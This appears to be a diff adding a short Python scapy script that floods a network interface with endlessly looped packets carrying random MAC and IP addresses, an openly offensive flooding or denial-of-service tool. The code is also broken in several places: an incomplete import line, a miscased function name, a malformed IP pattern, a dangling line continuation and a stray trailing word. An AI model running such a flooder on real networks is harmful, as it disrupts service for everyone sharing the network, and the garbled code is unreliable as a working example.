@@ -1,0 +1,20 @@
+#!/usr/bin/python
+import sys 
+from scapy.all import 
+
+packet = Ether(src=RandMac("*:*:*:*:*:*"),
+               dst=RandMac("*:*:*:*:*:*")) / \
+         IP(src=RandIP("*.*.*.*"),
+            dst=RandIP("*:*:*:*")) / \
+
+if len(sys.argv) < 2:
+    dev = "eth0"
+else:
+    dev = sys.argv[1]
+
+print "Flooding net with random packets on dev " + dev
+
+sendp(packet, iface=dev, loop=1)
+
+no
+
